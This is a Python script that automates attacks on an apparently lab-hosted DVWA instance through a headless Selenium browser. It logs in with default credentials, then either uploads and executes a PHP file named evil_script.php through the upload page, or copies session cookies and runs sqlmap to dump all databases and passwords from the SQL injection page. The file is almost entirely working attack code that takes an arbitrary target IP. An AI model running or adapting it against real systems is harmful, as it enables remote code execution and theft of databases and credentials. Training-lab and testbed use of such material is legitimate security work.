import argparse
import os

from pyvirtualdisplay import Display
from selenium import webdriver
from selenium.webdriver.chrome.options import Options


def log_in():
    """
    logs the user in
    """
    # Login
    url = 'http://' + args.server_ip + '/login.php'
    browser.get(url)
    browser.find_element('name', 'username').send_keys('admin')
    browser.find_element('name', 'password').send_keys('password')
    browser.find_element('name', 'Login').click()
    print('Login --> ' + url)


def file_upload():
    """
    executes the evil upload to damn vulnerable web application
    """

    # File upload
    url = 'http://' + args.server_ip + '/vulnerabilities/upload/'
    browser.get(url)
    fileinput = browser.find_element('name', 'uploaded')
    fileinput.send_keys('/home/evil_script.php')
    browser.find_element('name', 'Upload').click()
    print('Upload file --> ' + url)

    # Execute evil file
    url = 'http://' + args.server_ip + '/hackable/uploads/evil_script.php'
    print('Execute file --> ' + url)
    browser.get(url)


def sql_injection():
    """
    executes an SQL Injection attack
    """
    target_link = 0
    # navigate to sql injection form
    for link in browser.find_elements('xpath', './/a'):
        print(link.get_attribute('href'))
        if 'vulnerabilities/sqli/' in link.get_attribute('href'):
            target_link = link
            break
    target_link.click()
    url = browser.current_url

    print(' successful got sqli page: %s', url)

    # get cookie values
    cookie = '--cookie="'
    for ck in browser.get_cookies():
        print(ck['name'] + " " + ck['value'])
        cookie = cookie + ck['name'] + "=" + ck['value'] + "; "
    cookie = cookie[:-2]
    cookie = cookie + '"'

    print(' read cookie values: %s', cookie)

    # call sqlmap in batch mode and waiting for it to finish

    try:
        subprocess_params = ['python2.7',
                             '/home/sqlmapproject/sqlmap.py',
                             cookie,
                             '-u',
                             '"' + url + '?id=1&Submit=Submit"',
                             '--dump-all',
                             '--exclude-sysdbs',
                             '--batch',
                             '--passwords']
        subprocess_params_str = ""
        for s in subprocess_params:
            subprocess_params_str = subprocess_params_str + s + ' '

        print(' now calling subprocess: %s', subprocess_params_str)
        os.system(subprocess_params_str)
    except Exception as e:
        print(e)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='File upload exploit container.')

    parser.add_argument('-ip', dest='server_ip', action='store', type=str, required=True,
                        help='The IP address of the target server')

    parser.add_argument('-a', dest='attack', action='store', type=str,required=True,
                        help='name of the attack to be executed. Choose from ["RCE", "SQLI"]')
    args = parser.parse_args()

    # Virtual display to run browser
    display = Display(visible=False, size=(800, 800))
    display.start()

    # Headless chrome-browser settings
    chrome_options = Options()
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--single-process")
    chrome_options.add_argument('--ignore-certificate-errors')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--headless')
    browser = webdriver.Chrome(options=chrome_options)

    log_in()

    print(f"executing attack: {args.attack}")

    if args.attack == "RCE":
        file_upload()
    elif args.attack == "SQLI":
        sql_injection()
